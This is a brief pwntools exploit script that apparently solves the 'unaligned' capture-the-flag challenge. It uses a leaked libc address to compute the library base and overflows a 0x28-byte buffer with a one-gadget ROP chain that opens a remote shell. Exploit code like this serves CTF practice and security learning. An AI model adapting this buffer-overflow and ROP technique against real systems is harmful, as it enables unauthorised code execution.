from pwn import *
context.binary=exe=ELF("./unaligned",checksec=False)
libc=ELF("./libc.so.6",checksec=False)
#p=process(exe.path)
p=remote("unaligned.bsides.shellmates.club",443,ssl=True)
def GDB():
	gdb.attach(p,gdbscript= 
		'''
		ni
		'''
		)
	input()



#GDB()
offest=0x28
p.recvuntil(b"Gift: ")
leak=int(p.recvline()[:-1],16)
log.info('[+]leak:'+hex(leak))
libc.address=leak-0x4f420
log.info('[+]libc base:'+hex(libc.address))
pop_rcx=libc.address+0x000000000010c423
pop_rdi=libc.address+0x000000000002164f
syscall=libc.address+0x00000000000d2625
ret=libc.address+0x00000000000008aa
pop_rsp=libc.address+0x000000000000396c
payload=b"C"*(offest)
payload+=flat(
	pop_rcx,0,
	libc.address+0x4f2a5,
	)

p.sendlineafter(b"Name: ",payload)
p.interactive()